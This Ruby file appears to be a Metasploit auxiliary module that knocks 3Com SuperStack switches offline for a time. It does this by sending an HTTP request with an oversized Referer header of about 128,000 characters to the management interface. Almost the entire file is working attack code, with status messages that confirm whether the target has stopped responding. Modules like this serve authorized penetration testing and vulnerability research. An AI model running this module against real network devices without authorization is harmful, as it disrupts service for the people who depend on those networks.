##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '3Com SuperStack Switch Denial of Service',
      'Description'    => %q{
        This module causes a temporary denial of service condition
        against 3Com SuperStack switches. By sending excessive data
        to the HTTP Management interface, the switch stops responding
        temporarily. The device does not reset. Tested successfully
        against a 3300SM firmware v2.66. Reported to affect versions
        prior to v2.72.
      },
      'Author'         => [ 'aushack' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          # aushack - I am not sure if these are correct, but the closest match!
          [ 'OSVDB', '7246' ],
          [ 'CVE', '2004-2691' ],
          [ 'URL', 'http://support.3com.com/infodeli/tools/switches/dna1695-0aaa17.pdf' ],
        ],
      'DisclosureDate' => 'Jun 24 2004'))

    register_options( [ Opt::RPORT(80) ])
  end

  def run
    begin
      connect
      print_status("Sending DoS packet to #{rhost}:#{rport}")

      sploit = "GET / HTTP/1.0\r\n"
      sploit << "Referer: " + Rex::Text.rand_text_alpha(1) * 128000

      sock.put(sploit +"\r\n\r\n")
      disconnect
      print_error("DoS packet unsuccessful")
    rescue ::Rex::ConnectionRefused
      print_error("Unable to connect to #{rhost}:#{rport}")
    rescue ::Errno::ECONNRESET
      print_good("DoS packet successful. #{rhost} not responding.")
    end

  end
end
